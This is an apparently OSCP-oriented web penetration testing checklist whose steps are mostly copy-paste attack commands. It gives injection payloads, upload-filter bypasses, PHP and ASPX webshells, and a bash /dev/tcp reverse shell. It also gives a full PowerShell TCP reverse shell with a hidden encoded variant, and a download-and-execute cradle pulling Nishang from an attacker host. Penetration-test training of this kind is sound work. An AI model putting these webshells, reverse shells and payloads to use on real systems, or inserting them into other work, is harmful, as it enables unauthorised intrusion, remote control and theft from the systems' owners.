# Web Application Pentest Methodology — OSCP Exam Reference

Execution-order checklist from first contact with a web target to shell/foothold. Every step = copy-paste-ready commands with `<placeholders>`. Decision points mark where output branches your next move.

---

## 0. Recon & Fingerprinting

```bash
whatweb -a 3 http://<target> 2>&1 | tee whatweb.txt
curl -sI http://<target>
nikto -h http://<target> -o nikto.txt
wafw00f http://<target>
```

- Check page source, `robots.txt`, `sitemap.xml`, HTTP response headers (server banner, X-Powered-By), cookies (session naming reveals framework: `PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `laravel_session`).

**Decision point:** identified CMS (WordPress/Drupal/Joomla) → jump to §5 CMS-specific. Identified framework (Django/Laravel/Struts) → check for known CVEs on that exact version before generic fuzzing.

---

## 1. Directory / File Fuzzing

Run **both** dirsearch and feroxbuster — they use different wordlists/heuristics and each catches things the other misses. Don't rely on one.

### dirsearch

```bash
dirsearch -u http://<target> -e php,asp,aspx,jsp,html,txt,bak,zip,old,config -t 50 -o dirsearch_root.txt
# recurse into promising hits
dirsearch -u http://<target>/<found-dir>/ -e php,txt,bak -r -R 3
```

### feroxbuster

```bash
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raw-medium-directories.txt \
  -x php,asp,aspx,jsp,html,txt,bak,zip,old -t 50 -o ferox_root.txt

# recursive by default; force depth if needed, filter noise
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raw-medium-directories.txt \
  -x php,txt,bak --depth 3 -C 404,403
```

**Decision point:** `.git/` found → `git log -p` / `git-dumper` for leaked secrets. `.svn/` found → `svn log`. Backup file (`.bak`, `.old`, `~`) found → pull and diff against live app for hardcoded creds/logic. `config.php.bak`, `web.config`, `.env` found → source review for DB creds, secret keys (often reused for SSH/other services).

---

## 2. ffuf — Fuzzing & Vhost Enumeration

### Directory / extension fuzzing (fast alternative/supplement)

```bash
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raw-medium-directories.txt \
  -e .php,.asp,.aspx,.jsp,.txt,.bak -mc 200,204,301,302,307,401,403 -t 50 -o ffuf_dirs.json -of json
```

### Virtual host enumeration (critical — different vhost = different attack surface)

```bash
ffuf -u http://<target> -H "Host: FUZZ.<target>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <baseline-response-size> -t 50 -o ffuf_vhosts.json -of json
```

Get baseline size first with a bogus Host header (`curl -s -H "Host: doesnotexist.<target>" http://<target> | wc -c`) so `-fs` correctly filters the default/catch-all response.

**Decision point:** new vhost found → add to `/etc/hosts`, restart recon from §0 against it — treat as a brand-new target.

### Parameter fuzzing (GET/POST params, hidden fields)

```bash
ffuf -u "http://<target>/page.php?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs <baseline-size> -o ffuf_params.json -of json

ffuf -u "http://<target>/page.php" -X POST -d "FUZZ=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs <baseline-size>
```

### Extension/file discovery on a known dir

```bash
ffuf -u http://<target>/uploads/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raw-medium-files.txt -mc 200
```

---

## 3. Manual Crawl & Tech-Specific Probing

```bash
# view-source, JS files for hidden endpoints/API keys
curl -s http://<target>/app.js | grep -iE "api|key|token|endpoint|url\("
# Wappalyzer/whatweb already ran — confirm backend language from file extensions found in §1/§2
```

- Test every input field / URL param for: SQLi, XSS, LFI/RFI, SSTI, command injection, IDOR, XXE, SSRF, insecure deserialization, auth bypass, upload bypass. Full vector detail below.

---

## 4. Vulnerability Classes — Vector → Test → Tool

|Class|Quick manual test|Tool sweep|
|---|---|---|
|SQL injection|`'`, `' OR '1'='1`, `' AND SLEEP(5)--` in every param|`sqlmap -u "http://<target>/page.php?id=FUZZ" --batch --dbs`|
|LFI|`../../../../etc/passwd`, PHP wrappers `php://filter/convert.base64-encode/resource=<file>`|`ffuf -u "http://<target>/page.php?file=FUZZ" -w traversal-wordlist.txt`|
|RFI|`?file=http://<attacker-ip>/shell.txt` (needs `allow_url_include`)|manual|
|SSTI|`{{7*7}}`, `${7*7}`, `#{7*7}` in reflected input → 49 confirms|`tplmap -u "http://<target>/page?name=FUZZ"`|
|Command injection|`; id`, `` `id` ``, `$(id)`, `\|id` in any field that hits a shell-out|`commix --url="http://<target>/page.php?ip=FUZZ"`|
|XXE|Upload/submit XML with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`|Burp Repeater manual|
|IDOR|Increment/decrement numeric IDs, swap between two authenticated sessions|manual + Burp Autorize|
|SSRF|Point any "fetch URL" field at `http://127.0.0.1:<internal-port>` or cloud metadata `http://169.254.169.254/`|manual|
|Insecure deserialization|Inspect cookies/params for base64 blobs decoding to serialized objects (`O:`, `rO0`, `pickle`)|`ysoserial` (Java), `phpggc` (PHP)|
|Auth bypass|SQLi in login (`admin'--`), default creds, JWT `alg:none`, weak password reset tokens|Burp Intruder / manual|
|File upload|See §6 below|Burp Repeater|

**Decision point:** any of the above confirms with source-code/error-message evidence → move straight to exploitation for shell (§6/§7); don't keep fuzzing once you have a working vector.

---

## 5. CMS-Specific (if fingerprinted in §0)

```bash
# WordPress
wpscan --url http://<target> --enumerate u,vp,vt --api-token <token>
# Drupal
droopescan scan drupal -u http://<target>
# Joomla
joomscan -u http://<target>
```

**Decision point:** vulnerable plugin/theme version found → search Exploit-DB/searchsploit for that exact version before anything else.

---

## 6. File Upload → Webshell

**Bypass order to try (stop at first success):**

1. Change extension: `.php` → `.phtml`, `.php5`, `.pht`, `.phar`
2. Double extension: `shell.php.jpg`
3. Null byte (legacy): `shell.php%00.jpg`
4. MIME/Content-Type spoof only (`image/jpeg` header, real PHP content)
5. Magic bytes: prepend `GIF89a;` before PHP payload
6. Case manipulation: `shell.PhP`
7. `.htaccess` upload (if allowed) to make `.jpg` execute as PHP: `AddType application/x-httpd-php .jpg`

### Ready-to-use webshells

**PHP (minimal, GET or POST via `$_REQUEST`):**

```php
<?php system($_REQUEST['cmd']); ?>
```

**PHP — POST-only (see §7 for why POST matters):**

```php
<?php if(isset($_POST['cmd'])){ system($_POST['cmd']); } ?>
```

**ASPX (Windows/IIS targets):**

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

Or drop the standard SecLists/Kali one directly:

```bash
locate cmdasp.aspx
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

**JSP:**

```bash
locate cmd.jsp
cp /usr/share/webshells/jsp/cmd.jsp .
```

**Full PHP shells for interactive/complex tasks:**

```bash
locate laudanum   # Kali's built-in multi-language webshell pack (php, asp, aspx, jsp)
ls /usr/share/webshells/
```

---

## 7. Webshell: GET → POST Conversion (avoid WAF/encoding issues)

GET-based `cmd` params get URL-encoded and mangled on complex commands (pipes, quotes, `&&`, spaces) and are logged in plaintext in access logs / browser history / proxies. Convert to POST:

```bash
# GET (fragile — breaks on special chars, gets encoded/truncated)
curl "http://<target>/shell.php?cmd=whoami"

# POST (send raw, avoids URL-encoding issues with special chars)
curl -X POST http://<target>/shell.php --data-urlencode "cmd=whoami"

curl -X POST http://<target>/shell.php -d "cmd=id;uname -a"
```

If the webshell only accepts GET and you can't re-upload, wrap requests to always URL-encode via `--data-urlencode`, or in Burp Repeater: right-click → "Change request method" to convert GET→POST (Burp auto moves params to body).

For pipes/quotes/ampersands in the payload, always base64-encode the command and decode server-side to fully dodge encoding issues:

```bash
CMD=$(echo -n 'whoami; id; ip a' | base64 -w0)
curl -X POST http://<target>/shell.php --data-urlencode "cmd=echo $CMD | base64 -d | bash"
```

---

## 8. Reverse Shell — Web (Linux) → Interactive

```bash
# on attacker
nc -lvnp <port>

# via webshell (POST, per §7)
curl -X POST http://<target>/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'"
```

Fallback one-liners if `bash -i` is filtered: `nc`, `python3 -c 'import socket...'`, `php -r`, `perl -e` — pull from [revshells.com](https://revshells.com/) payload list as needed.

**Stabilize:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on attacker:
stty raw -echo; fg
```

---

## 9. Reverse Shell — Web (Windows/IIS) → PowerShell

This is the primary path once you have code execution on IIS/ASPX/Windows via a webshell.

**Step 1 — listener:**

```bash
nc -lvnp <port>
```

**Step 2 — PowerShell reverse shell one-liner (send via webshell POST body/param, base64-recommended to avoid quoting hell):**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Encode it to dodge shell-quoting/encoding through the webshell POST parameter:**

```bash
# on attacker: build the UTF-16LE base64 blob PowerShell -EncodedCommand expects
iconv -t UTF-16LE payload.ps1 | base64 -w0
```

```powershell
powershell -nop -w hidden -e <base64-blob>
```

Then trigger via the webshell:

```bash
curl -X POST http://<target>/shell.aspx --data-urlencode "cmd=powershell -nop -w hidden -e <base64-blob>"
```

**Alternative — Nishang/PowerCat (pull a script instead of typing a one-liner):**

```bash
# attacker: host Invoke-PowerShellTcp.ps1 (Nishang) via python http.server
python3 -m http.server 80
```

```powershell
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attacker-ip> -Port <port>"
```

Send that same way — POST body, base64-encoded if it has quotes/special chars.

**Stabilize (Windows side is already semi-interactive via the PS TCP client) — upgrade further with a full PowerShell/ConPTY session using a tool like `ligolo-ng` or Chisel if pivoting is needed.**

---

## 10. Post-Foothold Immediate Checks

```bash
whoami /all          # Windows
id; sudo -l          # Linux
```

→ hand off to Windows/Linux privilege escalation methodology from here.

---

## Fast-Path Priority Checklist (try first, in order)

1. `dirsearch` + `feroxbuster` in parallel on root — check for `.git`, backup files, admin panels
2. `ffuf` vhost enum — new vhost = new target, do this early
3. Fingerprint CMS/framework version → searchsploit known CVE
4. File upload functionality → extension bypass → webshell (POST-based from the start)
5. SQLi on any login/search form (`sqlmap --batch` sweep)
6. LFI on any `?page=`/`?file=` param
7. If Windows target + webshell landed → PowerShell reverse shell immediately, don't linger in the webshell

---

**Document as you go:** for every command above, note in your report _which enumeration finding_ justified running it (e.g. "ran sqlmap on `id` param because manual `' OR SLEEP(5)--` returned a 5s delay") — OSCP grading requires the reasoning chain, not just the successful exploit.